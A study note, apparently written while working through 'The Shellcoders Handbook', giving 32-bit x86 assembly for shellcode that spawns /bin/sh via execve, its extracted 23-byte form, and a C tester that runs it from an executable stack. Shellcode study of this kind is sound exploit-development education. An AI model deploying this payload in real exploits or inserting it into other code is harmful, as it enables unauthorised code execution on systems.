# Author:               ramb0
# Book:                 The Shellcoders Handbook
# Name:			spawn_shell 32 bit

# Code for our spawn_shell program in assembly

section .text
global _start

_start:
        xor eax, eax
        push eax                ; string terminator

        ; //bin/sh
        push 0x68732f2f
        push 0x6e69622f
        mov ebx, esp            ; move stack buffer to ebx
        xor ecx, ecx
        xor edx, edx
        mov al, 0xb             ; execve()
        int 0x80

# Compile the assembly code
nasm -f elf spawn_shell.asm
ld -m elf_i386 spawn_shell.o -o spawn_shell32

# Use 'objdump -d ./spawn_shell -M intel' for getting the bytes.
shellcode = ...
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"
size of 23 characters

# Testing the shellcode
# Create the file tester.c
tester.c:

include <iostream>

char *shell = "shellcode ...";

int main() {

        void (*func)();
        func = (void(*)())shell;
        (*func)();
}

# Compile the tester and execute
g++ -o shellcode_tester tester.c --no-warnings -m32 -z execstack
./shellcode_tester
